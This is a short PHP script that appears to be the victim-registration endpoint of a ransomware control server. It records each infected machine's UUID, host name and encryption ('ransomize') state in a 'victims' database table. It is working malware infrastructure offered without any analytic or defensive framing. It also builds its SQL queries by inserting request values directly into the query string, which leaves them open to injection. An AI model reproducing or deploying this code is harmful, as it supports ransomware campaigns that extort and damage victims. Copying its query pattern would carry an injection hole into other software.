
<?php

$UUID = htmlspecialchars($_POST['UUID']);
$ed_state = htmlspecialchars(intval($_POST['ed_state']));
$HOST = htmlspecialchars($_POST['HOST']);

require "conf.php";

$sql = "SELECT * FROM victims WHERE system_ID = '$UUID'";
$res = $conn -> query($sql);
$count = mysqli_num_rows($res);

if($count > 0)
{
	echo json_encode(['status' => True, 'data' => "Record Exists"]);
}
else
{
	$sql = "INSERT INTO victims (system_ID, ransomize, custom_identifier) VALUES ('$UUID', $ed_state, '$HOST')";
	$res = $conn -> query($sql);
	echo json_encode(['status' => True, 'data' => "Record Created"]);
}

$conn -> close();

?>